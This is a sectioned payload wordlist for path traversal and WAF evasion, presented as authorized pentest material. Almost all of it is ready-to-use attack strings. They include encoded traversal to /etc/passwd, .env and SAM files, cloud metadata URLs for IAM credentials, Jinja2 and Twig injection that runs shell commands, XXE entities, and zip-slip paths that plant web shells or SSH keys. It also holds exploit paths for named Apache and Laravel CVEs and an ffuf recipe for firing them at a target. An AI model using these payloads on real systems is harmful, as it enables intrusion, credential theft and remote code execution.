# ============================================================================
# AGGRESSIVE TESTING PAYLOADS - REAL-WORLD ATTACK SIMULATION
# ============================================================================
# Purpose: Simulate actual attacker behavior in authorized testing
# Approach: Blackhat techniques for whitehat purposes
# Warning: ONLY use with explicit written authorization
# ============================================================================

# ============================================================================
# SECTION 1: POLYMORPHIC ENCODING (Evades Signature Detection)
# ============================================================================

# Multiple encoding layers in single payload
%252e%252e%2f%c0%ae%c0%ae%2f..%2f%u002e%u002e%2fetc%2fpasswd
%c0%ae%252e%u002e./%c0%ae%252e%u002e./etc/passwd
..%2f%c0%ae%c0%ae%252f%u002e%u002e%2f..;/etc/passwd

# Character substitution polymorphism
%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
%2e%2e/%2e%2e/%65tc/%70asswd
%2e%2e%2f%2e%2e%2f%65%74%63/%70%61%73%73%77%64

# Mixed case polymorphism with encoding
%2E%2e%2F%2e%2E%2fetC%2FPasSwD
%2e%2E%2f%2E%2e%2feTc%2fpAsSwD
%2E%2E%2f%2e%2e%2fETC%2fPASSWD

# ============================================================================
# SECTION 2: TIME-BASED EVASION (Slow Requests)
# ============================================================================

# Newline delays (some WAFs timeout)
..%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a/..%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a/etc/passwd

# Excessive padding
..////////..////////..////////etc////passwd
..\\\\\\\\..\\\\\\\\..\\\\\\\\etc\\\\passwd
..%2f%2f%2f%2f%2f%2f%2f%2f..%2f%2f%2f%2f%2f%2f%2f%2fetc%2fpasswd

# ============================================================================
# SECTION 3: PARAMETER POLLUTION & FRAGMENTATION
# ============================================================================

# HPP (HTTP Parameter Pollution)
?file=innocent.txt&file=../../etc/passwd
?path=safe&path=../../etc/passwd
?doc=ok&file=../../etc/passwd

# Split across parameters
?dir=../../&file=etc/passwd
?base=../&path=../&target=etc/passwd
?a=..&b=/..&c=/etc&d=/passwd

# JSON fragmentation
{"path":"../", "file":"../etc/passwd"}
{"dir":"../../", "name":"etc/passwd"}
{"a":"..","b":"/","c":"..","d":"/etc/passwd"}

# ============================================================================
# SECTION 4: HEADER INJECTION BYPASSES
# ============================================================================

# X-Forwarded-* headers with traversal
X-Original-URL: ../../etc/passwd
X-Rewrite-URL: ../../../etc/passwd
X-Forwarded-For: 127.0.0.1/../../etc/passwd

# Custom headers (often not filtered)
X-Custom-Path: ../../etc/passwd
X-File-Path: ../../../etc/passwd
X-Original-Path: ../../../../etc/passwd

# ============================================================================
# SECTION 5: RACE CONDITION EXPLOITS
# ============================================================================

# Rapid-fire requests (overwhelm WAF, one might slip through)
# Send 100+ of these simultaneously:
../../etc/passwd
%2e%2e%2fetc%2fpasswd
..%2fetc%2fpasswd
%2e%2e/etc/passwd
..%2f%65tc%2fpasswd

# ============================================================================
# SECTION 6: PARSER DIFFERENTIAL ATTACKS
# ============================================================================

# Exploit differences between WAF and application parsers

# URL vs Body parameter confusion
POST /?file=safe.txt
Body: file=../../etc/passwd

# Content-Type confusion
Content-Type: application/json
{"file":"../../etc/passwd"}

Content-Type: application/x-www-form-urlencoded
file=%2e%2e%2fetc%2fpasswd

# Multipart confusion
Content-Type: multipart/form-data; boundary=----Boundary
------Boundary
Content-Disposition: form-data; name="file"

../../etc/passwd
------Boundary--

# ============================================================================
# SECTION 7: UNICODE NORMALIZATION ATTACKS
# ============================================================================

# NFKC normalization exploitation
%uFF0E%uFF0E%uFF0F%uFF0E%uFF0E%uFF0Fetc%uFF0Fpasswd
%uFE56%uFE56%u2215etc%u2215passwd
%u2024%u2024%u2044etc%u2044passwd

# Homoglyph attacks (visually similar characters)
．．／．．／etc／passwd
‥/‥/etc/passwd
··/··/etc/passwd

# Width variations
ｅｔｃ／ｐａｓｓｗｄ
../../../ｅｔｃ/ｐａｓｓｗｄ

# ============================================================================
# SECTION 8: LENGTH-BASED EVASION
# ============================================================================

# Extremely long paths (exhaust WAF buffers)
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd

# Padding with junk
../../etc/passwd/../../../etc/passwd/../../../etc/passwd
..////////../..///////..////////etc//////passwd

# ============================================================================
# SECTION 9: PROTOCOL SMUGGLING
# ============================================================================

# HTTP Request Smuggling patterns
GET /../etc/passwd HTTP/1.1
Host: target.com
Content-Length: 0

GET /api?file=../../etc/passwd HTTP/1.1

# CRLF injection with traversal
/%0d%0aLocation:%20../../etc/passwd
/test%0d%0aX-Custom:%20../../etc/passwd

# ============================================================================
# SECTION 10: ENCODING STACK OVERFLOW
# ============================================================================

# Stack multiple encodings to confuse decoders
%25%32%65%25%32%65%25%32%66etc%25%32%66passwd
%252525252525252e%252525252525252e%252525252525252fetc%252525252525252fpasswd
%2525252525252525252e%2525252525252525252e%2525252525252525252fetc%2525252525252525252fpasswd

# ============================================================================
# SECTION 11: DIRECTORY LISTING ENUMERATION
# ============================================================================

# Common misconfigurations
../../
../../../
../../../../
../../../../../../
../../../../../../../../../../../

# Index file access
../../index.php
../../../index.html
../../../../default.aspx

# Backup file enumeration
../../etc/passwd.bak
../../etc/passwd~
../../etc/passwd.old
../../etc/passwd.backup
../../etc/.passwd.swp
../../etc/passwd.save

# ============================================================================
# SECTION 12: CHAINED EXPLOITATION
# ============================================================================

# LFI to RCE chains
../../proc/self/environ
../../var/log/apache2/access.log
../../var/log/nginx/access.log
../../var/log/auth.log

# Include user-controlled logs
../../var/log/apache2/access.log%00
../../var/log/mail.log
../../var/log/vsftpd.log

# Session file inclusion
../../tmp/sess_[SESSION_ID]
../../var/lib/php/sessions/sess_[SESSION_ID]
../../var/lib/php5/sess_[SESSION_ID]

# ============================================================================
# SECTION 13: AUTOMATION EVASION
# ============================================================================

# Randomized encoding positions (different each time)
%2e%2e/..%2fetc%2fpasswd
..%2f%2e%2e/etc%2fpasswd
%2e%2e%2f../etc%2fpasswd

# Junk parameter injection
?file=../../etc/passwd&junk=aaaa&noise=bbbb
?x=1&file=../../etc/passwd&y=2
?file=../../etc/passwd&random=12345

# ============================================================================
# SECTION 14: FILTER RECURSION BYPASS (ADVANCED)
# ============================================================================

# Triple nesting
......///......///......///etc/passwd
....\\\....\\\....\\\etc\passwd
....//....//../....//../....//../etc/passwd

# Quadruple nesting
........////........////etc/passwd
........\\\\........\\\\etc\\passwd

# Mixed nesting patterns
..../\/....\/\..../\/etc/passwd
....\/..\...\/..\etc/passwd

# ============================================================================
# SECTION 15: OBFUSCATION WITH VALID PATHS
# ============================================================================

# Hide in legitimate-looking paths
/images/../../../etc/passwd
/static/../../etc/passwd
/assets/../../../etc/passwd
/uploads/../../etc/passwd
/tmp/../../../etc/passwd
/cache/../../etc/passwd

# API endpoint abuse
/api/v1/../../etc/passwd
/api/download?file=../../etc/passwd
/api/read?path=../../../etc/passwd

# ============================================================================
# SECTION 16: OS-SPECIFIC ADVANCED BYPASSES
# ============================================================================

# Linux proc filesystem (information disclosure)
../../proc/self/cmdline
../../proc/self/environ
../../proc/self/status
../../proc/self/fd/0
../../proc/self/fd/1
../../proc/self/fd/2
../../proc/self/cwd
../../proc/self/exe
../../proc/self/maps
../../proc/self/mem
../../proc/version
../../proc/net/arp
../../proc/net/route
../../proc/net/tcp
../../proc/net/udp
../../proc/net/fib_trie

# Windows alternate data streams
../../windows/win.ini::$DATA
../../boot.ini::$DATA
../../windows/system32/config/sam::$DATA

# Windows short names (8.3 format)
../../WINDOW~1/SYSTEM~1/CONFIG/SAM
../../PROGRA~1/
../../WINDOW~1/WIN.INI

# ============================================================================
# SECTION 17: CLOUD METADATA SERVICE EXPLOITATION
# ============================================================================

# AWS Metadata (SSRF + Path Traversal combo)
@169.254.169.254/../../proc/self/environ
/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
@metadata.google.internal/../../etc/passwd
/proxy?url=http://metadata.google.internal/computeMetadata/v1/

# Azure
@169.254.169.254/metadata/instance?api-version=2021-02-01
/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token

# ============================================================================
# SECTION 18: ZIP/ARCHIVE UPLOAD EXPLOITATION (ZIP SLIP)
# ============================================================================

# Malicious archive entries
../../../../../../tmp/malicious.php
../../../../../../../var/www/html/shell.php
../../../../../../../../root/.ssh/authorized_keys

# Windows paths in archives
../../../../../../windows/system32/config/sam
..\\..\\..\\..\\..\\windows\\win.ini

# ============================================================================
# SECTION 19: SOURCE CODE DISCLOSURE
# ============================================================================

# Common source files
../../index.php
../../config.php
../../database.php
../../connection.php
../../db.php
../../settings.php
../../app.php
../../.env
../../.git/config
../../.git/HEAD
../../.svn/entries
../../composer.json
../../package.json
../../web.config
../../.htaccess

# Backup and temporary files
../../index.php.bak
../../index.php~
../../index.php.old
../../index.php.save
../../.index.php.swp
../../index.php.backup

# ============================================================================
# SECTION 20: TEMPLATE INJECTION + PATH TRAVERSAL
# ============================================================================

# Jinja2 template injection with LFI
{{request.application.__globals__.__builtins__.__import__('os').popen('cat ../../etc/passwd').read()}}

# Twig template injection
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat ../../etc/passwd")}}

# ============================================================================
# SECTION 21: XXE + PATH TRAVERSAL
# ============================================================================

# External entity with file inclusion
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Parameter entity
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root></root>

# ============================================================================
# SECTION 22: DESERIALIZATION + PATH TRAVERSAL
# ============================================================================

# PHP unserialize with path traversal
O:8:"FileRead":1:{s:4:"path";s:17:"../../etc/passwd";}

# Java deserialization gadgets (conceptual)
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAN3CAAAAAQAAAABdAAEcGF0aHQAEi4uLy4uL2V0Yy9wYXNzd2R4

# ============================================================================
# SECTION 23: POLYGLOT PAYLOADS
# ============================================================================

# Works across multiple contexts
'"><svg/onload=alert(1)>../../etc/passwd
javascript:alert(1);//../../etc/passwd
data:text/html,<script>alert(1)</script>../../etc/passwd

# ============================================================================
# SECTION 24: ADVANCED WINDOWS TECHNIQUES
# ============================================================================

# UNC path with authentication bypass
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\system32\drivers\etc\hosts
\\?\c:\windows\win.ini
\\.\globalroot\device\harddiskvolume1\windows\win.ini

# NTFS alternate data streams
../../windows/system32/drivers\etc\hosts:$DATA
../../test.txt::$INDEX_ALLOCATION

# Windows reserved names
../../CON
../../PRN
../../AUX
../../NUL
../../COM1
../../LPT1

# ============================================================================
# SECTION 25: CUSTOM FUZZING PATTERNS
# ============================================================================

# Generate variations programmatically
../{fuzz}/etc/passwd
../../{fuzz}/passwd
../{fuzz}/../etc/passwd

# Replace {fuzz} with:
# - Different encodings
# - Junk characters
# - Valid directory names
# - Empty strings
# - Null bytes

# ============================================================================
# SECTION 26: REAL-WORLD CVE EXPLOITATION PATTERNS
# ============================================================================

# Based on actual vulnerabilities

# CVE-2021-41773 (Apache 2.4.49)
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# CVE-2021-42013 (Apache 2.4.50)
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd

# CVE-2019-11580 (Atlassian Crowd)
/crowd/plugins/servlet/exp?cmd=cat%20/etc/passwd

# CVE-2018-15133 (Laravel)
/profile/%0d%0a%0d%0a%3C?php%20system($_GET[1]);?%3E/../../../storage/logs/laravel.log

# ============================================================================
# SECTION 27: AGGRESSIVE AUTOMATION PAYLOAD SETS
# ============================================================================

# High-volume testing patterns (1000+ variations)
# Use these with automated tools like ffuf, wfuzz, Burp Intruder

# Encoding permutations
..%ENCODE1%..%ENCODE2%etc%ENCODE3%passwd
# Where ENCODE can be: %2f, %2F, %5c, %5C, /, \, %u2215, %c0%af

# Depth variations (1-30 levels)
../etc/passwd
../../etc/passwd
../../../etc/passwd
# ... continue to 30 levels

# Platform-specific payloads matrix
# [DEPTH][SEPARATOR][ENCODING][TARGET]
# Example: ../../%2f..%5cetc%2fpasswd

# ============================================================================
# SECTION 28: CONTEXT-AWARE BYPASSES
# ============================================================================

# Based on application type

# WordPress
../../wp-config.php
../../wp-content/uploads/../../wp-config.php

# Drupal
../../sites/default/settings.php
../../.htaccess

# Joomla
../../configuration.php

# Laravel
../../.env
../../storage/logs/laravel.log

# Django
../../settings.py
../../manage.py

# Node.js
../../.env
../../package.json
../../node_modules/

# ============================================================================
# SECTION 29: EVASION THROUGH COMPLEXITY
# ============================================================================

# Make payload so complex WAF can't parse it
%2e%2e%2f%c0%ae%c0%ae%u2215..%5c%252e%252e%2f%2e%2e;/....//etc%00/passwd%20%09%0a

# Multiple bypass techniques in one payload
....//..%00/..%u2215%c0%ae%c0%ae%5c..;/etc/passwd%00.jpg

# ============================================================================
# SECTION 30: ZERO-DAY SIMULATION PATTERNS
# ============================================================================

# Simulate novel attack patterns
# These represent theoretical bypasses that might work on unknown vulnerabilities

# Unusual character combinations
..%E3%80%82/%E3%80%82/%E3%80%82/etc/passwd
..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd

# Mathematical Unicode
..%u2215..%u2216..%u2044etc%u2215passwd

# Bidirectional override
..%u202e/..%u202e/etc/passwd

# Zero-width characters
..%u200B/%u200C/%u200Detc/passwd

# ============================================================================
# END OF AGGRESSIVE TESTING PAYLOADS
# ============================================================================
#
# USAGE RECOMMENDATIONS:
#
# 1. START WITH BASIC: Test basic traversal first
# 2. ESCALATE GRADUALLY: Move to encoded versions
# 3. USE AUTOMATION: Tools like ffuf, Burp Suite, custom scripts
# 4. DOCUMENT EVERYTHING: Log all requests and responses
# 5. RATE LIMIT YOURSELF: Don't DoS the target
# 6. VERIFY AUTHORIZATION: Double-check scope before testing
#
# AUTOMATION EXAMPLE (ffuf):
# ffuf -w this_file.txt -u https://target.com/api?file=FUZZ -mc 200
#
# BURP INTRUDER:
# - Load payloads from this file
# - Use cluster bomb attack for multiple injection points
# - Set up grep matches for success indicators
#
# ============================================================================
